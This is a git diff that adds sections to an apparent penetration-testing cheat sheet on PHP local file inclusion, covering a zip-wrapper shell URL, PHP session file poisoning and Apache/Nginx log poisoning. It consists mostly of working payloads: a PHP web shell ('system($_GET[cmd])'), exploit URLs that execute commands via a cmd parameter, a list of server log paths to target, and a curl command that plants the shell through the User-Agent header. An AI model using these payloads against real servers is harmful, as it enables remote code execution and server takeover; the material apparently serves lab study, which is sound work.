@@ -108,5 +108,46 @@ $phar->stopBuffering();
 ```bash
 # Example
 http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
-
 ```
+# Log Poisoning
+## PHP Session Poisoning
+if the PHPSESSID cookie is set to el4ukv0kqbvoirg7nkp4dncpk3, then its location on disk would be /var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3
+- Poisoning session
+```bash
+http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
+```
+- Upload payload
+```bash
+# Payload
+<?php system($_GET["cmd"]);?>
+# EXPLOIT
+http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
+```
+## Server Log Poisoning
+- Common paths
+```bash
+# Linux
+/var/log/apache2/access.log
+/var/log/nginx/access.log
+# Depending of the services open
+/var/log/sshd.log
+/var/log/mail
+/var/log/vsftpd.log
+# Windows
+C:\xampp\apache\logs\
+C:\nginx\log\ 
+```
+- We will use Burp Suite to intercept our earlier LFI request and modify the User-Agent header to Apache Log Poisoning:
+<img width="1269" height="730" alt="image" src="https://github.com/user-attachments/assets/c9d4e81c-f54d-4491-9d45-7f9b780d2bae" />
+
+- Payload in User-Agent
+Burpsuite
+<img width="1268" height="297" alt="image" src="https://github.com/user-attachments/assets/c1d39c08-67c2-4444-b61f-a64b5bd8aafd" />
+
+Curl
+```bash
+echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
+curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
+```
+
+- <img width="1265" height="598" alt="image" src="https://github.com/user-attachments/assets/f0bbd7b5-c834-42fb-81ee-8153f08faaf3" />
